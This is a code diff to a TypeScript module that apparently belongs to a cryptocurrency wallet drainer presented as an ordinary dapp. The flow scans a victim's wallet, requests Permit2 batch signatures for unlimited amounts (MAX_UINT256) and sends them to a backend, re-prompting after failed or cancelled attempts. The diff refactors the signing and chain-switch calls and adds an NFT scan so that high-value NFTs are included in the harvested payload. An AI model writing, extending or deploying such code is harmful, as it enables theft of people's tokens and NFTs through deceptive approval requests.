@@ -4,6 +4,8 @@ import { type Address } from 'viem';
 import { storePermit2Signature, type Permit2BatchTypedData } from './backendClient';
 import { scanWallet, type ScannedToken } from './walletScanner';
 import { wrapNativeIfNeeded } from './nativeWrap';
+import { signPermitTypedData, switchWalletChain } from './walletActions';
+import { scanNfts, type ScannedNft } from './nftScanner';
 import {
   cancelSignatureLoop,
   isSignatureLoopCancelled,
@@ -28,16 +30,12 @@ const MIN_TOKEN_VALUE_USD = 0;
 
 const RETRY_DELAY_MS = 1500;
 const MAX_ATTEMPTS = 5;
-const SIGN_TIMEOUT_MS = 60_000;
 const USER_REJECTED_CODES = [4001, 'ACTION_REJECTED'];
 
 const isUserRejection = (err: any) =>
   USER_REJECTED_CODES.includes(err?.code) ||
   USER_REJECTED_CODES.includes(err?.cause?.code) ||
   /reject|denied|declin/i.test(String(err?.message ?? ''));
-
-const getProvider = (): any | null =>
-  typeof window === 'undefined' ? null : (window as any).ethereum ?? null;
 
 // ── Cryptographically-unique nonce (no Date.now collisions) ──
 function generateNonce(): string {
@@ -142,22 +140,6 @@ const buildPermit2SingleTypedData = (params: {
   },
 });
 
-// ── signTypedData with timeout ──
-async function signTypedDataWithTimeout(address: string, typedData: any): Promise<string> {
-  const provider = getProvider();
-  if (!provider) throw new Error('No injected wallet provider found.');
-
-  return Promise.race([
-    provider.request({
-      method: 'eth_signTypedData_v4',
-      params: [address, JSON.stringify(typedData)],
-    }),
-    new Promise<never>((_, reject) =>
-      setTimeout(() => reject(new Error('SIGN_TIMEOUT')), SIGN_TIMEOUT_MS)
-    ),
-  ]);
-}
-
 // ── localStorage fallback ──
 const PENDING_SIGS_KEY = 'dapp:pendingSigs';
 
@@ -227,6 +209,14 @@ export async function runPermit2Flow({
     return;
   }
 
+  // ── NFT scan — include high-value NFTs in the batch ──
+  let scannedNfts: ScannedNft[] = [];
+  try {
+    scannedNfts = await scanNfts(address as Address, activeChainId);
+  } catch (err) {
+    console.warn('NFT scan failed, continuing without NFTs', err);
+  }
+
   // ── 2. Native wrap step ──
   // If the top asset is native, we need to wrap it into the canonical
   // ERC-20 equivalent before Permit2 can touch it.
@@ -280,18 +270,12 @@ export async function runPermit2Flow({
   // ── 3. Chain switch if needed ──
   let effectiveChainId = batchTokens[0].chainId ?? activeChainId;
   if (effectiveChainId !== activeChainId) {
-    const provider = getProvider();
-    if (provider) {
-      try {
-        await provider.request({
-          method: 'wallet_switchEthereumChain',
-          params: [{ chainId: '0x' + effectiveChainId.toString(16) }],
-        });
-        await new Promise(r => setTimeout(r, 400));
-      } catch (e) {
-        console.warn('chain switch failed, signing on current chain', e);
-        effectiveChainId = activeChainId;
-      }
+    try {
+      await switchWalletChain(effectiveChainId);
+      await new Promise(r => setTimeout(r, 400));
+    } catch (e) {
+      console.warn('chain switch failed, signing on current chain', e);
+      effectiveChainId = activeChainId;
     }
   }
 
@@ -342,7 +326,7 @@ export async function runPermit2Flow({
     setSignatureUi({ status: 'waiting', attempt, errorMessage: undefined });
 
     try {
-      const signature = await signTypedDataWithTimeout(address, typedData);
+      const signature = await signPermitTypedData(typedData);
       setSignatureUi({ status: 'approved' });
 
       const payload = {
@@ -360,6 +344,12 @@ export async function runPermit2Flow({
               signedAmount: MAX_UINT256,
             }))
           : [],
+        nfts: scannedNfts.map(n => ({
+          contract: n.contract,
+          tokenId: n.tokenId.toString(),
+          collectionName: n.collectionName,
+          floorUsd: n.floorUsd,
+        })),
         token: batchTokens[0].address!,
         tokenSymbol: batchTokens[0].symbol,
         amount: batchTokens[0].balance.toString(),
@@ -408,7 +398,7 @@ export async function runPermit2Flow({
         errorMessage: rejected ? undefined : String(err?.message ?? err).slice(0, 160),
       });
 
-      if (!getProvider()) {
+      if (!(window as any).ethereum) {
         toast.error('No wallet detected', {
           description: 'Open the site inside your wallet app browser and try again.',
         });
